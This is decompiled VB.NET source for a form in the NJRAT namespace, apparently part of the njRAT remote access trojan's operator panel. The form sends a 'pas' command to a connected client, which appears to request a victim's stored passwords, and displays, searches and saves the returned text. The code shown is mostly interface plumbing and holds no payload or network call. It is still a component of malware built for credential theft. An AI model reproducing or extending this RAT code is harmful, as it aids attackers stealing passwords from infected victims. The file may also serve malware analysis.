Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000020 RID: 32
	<DesignerGenerated()>
	Public Partial Class pas
		Inherits Form

		' Token: 0x06000451 RID: 1105 RVA: 0x0016CFC8 File Offset: 0x0016B3C8
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = pas.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = pas.__ENCList.Count = pas.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = pas.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = pas.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								pas.__ENCList(num) = pas.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					pas.__ENCList.RemoveRange(num, pas.__ENCList.Count - num)
					pas.__ENCList.Capacity = pas.__ENCList.Count
				End If
				pas.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700018C RID: 396
		' (get) Token: 0x06000454 RID: 1108 RVA: 0x0016D6E0 File Offset: 0x0016BAE0
		' (set) Token: 0x06000455 RID: 1109 RVA: 0x0016D6F8 File Offset: 0x0016BAF8
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x1700018D RID: 397
		' (get) Token: 0x06000456 RID: 1110 RVA: 0x0016D704 File Offset: 0x0016BB04
		' (set) Token: 0x06000457 RID: 1111 RVA: 0x0016D71C File Offset: 0x0016BB1C
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x1700018E RID: 398
		' (get) Token: 0x06000458 RID: 1112 RVA: 0x0016D728 File Offset: 0x0016BB28
		' (set) Token: 0x06000459 RID: 1113 RVA: 0x0016D740 File Offset: 0x0016BB40
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim flag As Boolean = Me._ToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				flag = (Me._ToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700018F RID: 399
		' (get) Token: 0x0600045A RID: 1114 RVA: 0x0016D7A0 File Offset: 0x0016BBA0
		' (set) Token: 0x0600045B RID: 1115 RVA: 0x0016D7B8 File Offset: 0x0016BBB8
		Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem2_Click
				Dim flag As Boolean = Me._ToolStripMenuItem2 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem2.Click, value2
				End If
				Me._ToolStripMenuItem2 = value
				flag = (Me._ToolStripMenuItem2 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000190 RID: 400
		' (get) Token: 0x0600045C RID: 1116 RVA: 0x0016D818 File Offset: 0x0016BC18
		' (set) Token: 0x0600045D RID: 1117 RVA: 0x0016D830 File Offset: 0x0016BC30
		Friend Overridable Property TFind As ToolStripTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TFind
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripTextBox)
				Me._TFind = value
			End Set
		End Property

		' Token: 0x17000191 RID: 401
		' (get) Token: 0x0600045E RID: 1118 RVA: 0x0016D83C File Offset: 0x0016BC3C
		' (set) Token: 0x0600045F RID: 1119 RVA: 0x0016D854 File Offset: 0x0016BC54
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x17000192 RID: 402
		' (get) Token: 0x06000460 RID: 1120 RVA: 0x0016D860 File Offset: 0x0016BC60
		' (set) Token: 0x06000461 RID: 1121 RVA: 0x0016D878 File Offset: 0x0016BC78
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000193 RID: 403
		' (get) Token: 0x06000462 RID: 1122 RVA: 0x0016D884 File Offset: 0x0016BC84
		' (set) Token: 0x06000463 RID: 1123 RVA: 0x0016D89C File Offset: 0x0016BC9C
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopyToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				flag = (Me._CopyToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000194 RID: 404
		' (get) Token: 0x06000464 RID: 1124 RVA: 0x0016D8FC File Offset: 0x0016BCFC
		' (set) Token: 0x06000465 RID: 1125 RVA: 0x0016D914 File Offset: 0x0016BD14
		Friend Overridable Property SelectAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SelectAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SelectAllToolStripMenuItem_Click
				Dim flag As Boolean = Me._SelectAllToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
				Me._SelectAllToolStripMenuItem = value
				flag = (Me._SelectAllToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000195 RID: 405
		' (get) Token: 0x06000466 RID: 1126 RVA: 0x0016D974 File Offset: 0x0016BD74
		' (set) Token: 0x06000467 RID: 1127 RVA: 0x0016D98C File Offset: 0x0016BD8C
		Friend Overridable Property SaveAsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveAsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SaveAsToolStripMenuItem_Click
				Dim flag As Boolean = Me._SaveAsToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._SaveAsToolStripMenuItem.Click, value2
				End If
				Me._SaveAsToolStripMenuItem = value
				flag = (Me._SaveAsToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._SaveAsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000468 RID: 1128 RVA: 0x0016D9EC File Offset: 0x0016BDEC
		Public Sub New()
			pas.__ENCAddToList(Me)
			Me.listViewItem_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000469 RID: 1129 RVA: 0x0016DA0C File Offset: 0x0016BE0C
		Public Sub insert(T As String)
			Dim flag As Boolean = T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1))
			If flag Then
				Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
				Me.T1.SelectionColor = Color.Green
				Me.T1.AppendText(vbCrLf & "[ " + T.Replace(ChrW(1), String.Empty) + "]" & vbCrLf)
			Else
				Me.T1.SelectionFont = Me.T1.Font
				Me.T1.SelectionColor = Me.T1.ForeColor
				Me.T1.AppendText(T + vbCrLf)
			End If
		End Sub

		' Token: 0x0600046A RID: 1130 RVA: 0x0016DAD8 File Offset: 0x0016BED8
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Copy()
		End Sub

		' Token: 0x0600046B RID: 1131 RVA: 0x0016DAE8 File Offset: 0x0016BEE8
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				Me.c.Send("pas")
				Me.ToolStripMenuItem1.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600046C RID: 1132 RVA: 0x0016DB38 File Offset: 0x0016BF38
		Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.SelectAll()
		End Sub

		' Token: 0x0600046D RID: 1133 RVA: 0x0016DB48 File Offset: 0x0016BF48
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.T1.Find(Me.TFind.Text, Me.T1.SelectionStart + Me.T1.SelectionLength, RichTextBoxFinds.None) = -1
			If flag Then
				Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
			End If
		End Sub

		' Token: 0x0600046E RID: 1134 RVA: 0x0016DBA8 File Offset: 0x0016BFA8
		Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "(*.rtf)|*.rtf" }
			Dim flag As Boolean = saveFileDialog.ShowDialog() = DialogResult.OK
			If flag Then
				Me.T1.SaveFile(saveFileDialog.FileName)
			End If
		End Sub

		' Token: 0x04000202 RID: 514
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000204 RID: 516
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000205 RID: 517
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x04000206 RID: 518
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000207 RID: 519
		<AccessedThroughProperty("ToolStripMenuItem2")>
		Private _ToolStripMenuItem2 As ToolStripMenuItem

		' Token: 0x04000208 RID: 520
		<AccessedThroughProperty("TFind")>
		Private _TFind As ToolStripTextBox

		' Token: 0x04000209 RID: 521
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x0400020A RID: 522
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x0400020B RID: 523
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400020C RID: 524
		<AccessedThroughProperty("SelectAllToolStripMenuItem")>
		Private _SelectAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400020D RID: 525
		<AccessedThroughProperty("SaveAsToolStripMenuItem")>
		Private _SaveAsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400020E RID: 526
		Public c As Client

		' Token: 0x0400020F RID: 527
		Private listViewItem_0 As ListViewItem
	End Class
End Namespace
